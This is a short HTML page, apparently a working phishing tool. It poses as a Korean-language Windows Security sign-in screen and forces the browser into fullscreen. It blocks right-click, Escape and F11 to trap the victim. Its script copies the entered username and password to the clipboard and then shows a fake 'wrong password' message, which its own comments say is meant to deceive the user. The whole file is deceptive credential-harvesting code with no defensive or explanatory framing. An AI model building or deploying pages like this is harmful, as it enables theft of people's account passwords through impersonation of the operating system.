<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Windows 보안</title>
    <style>
        body {
            margin: 0;
            background: #000;
            color: #fff;
            font-family: Segoe UI, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        h1 { font-size: 2.8em; }
        p { font-size: 1.3em; }
        input {
            padding: 12px;
            width: 320px;
            margin: 10px;
            font-size: 1.1em;
            border: none;
            border-radius: 4px;
        }
        button {
            padding: 12px 40px;
            font-size: 1.2em;
            background: #0067c5;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Windows</h1>
    <form id="frm">
        <input type="text" id="u" placeholder="이메일 또는 사용자 이름" required autofocus><br>
        <input type="password" id="p" placeholder="비밀번호" required><br>
        <button type="button" onclick="saveCred()">로그인</button>
    </form>
    <p id="err" style="color:red;display:none;">잘못된 비밀번호입니다. 다시 시도하세요.</p>

    <script>
        function saveCred() {
            var u = document.getElementById('u').value;
            var p = document.getElementById('p').value;
            
            if (u && p) {
                // 입력된 ID/PW를 클립보드로 복사
                navigator.clipboard.writeText('ID: ' + u + '\nPW: ' + p);
                
                // 사용자를 속이기 위해 에러 메시지 출력
                document.getElementById('err').style.display = 'block';
            }
        }

        // 우클릭 방지
        document.oncontextmenu = () => { return false; };

        // ESC 키 방지 (키오스크 모드에서 빠져나가는 것을 어렵게 함)
        document.onkeydown = e => {
            if (e.key === 'Escape') return false;
        }
        document.addEventListener('keydown', e => {
            if (e.key === 'F11' || e.key === 'Escape') e.preventDefault();
        });
        window.onload = () => {
            if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
            }
        };
    </script>
</body>
</html>
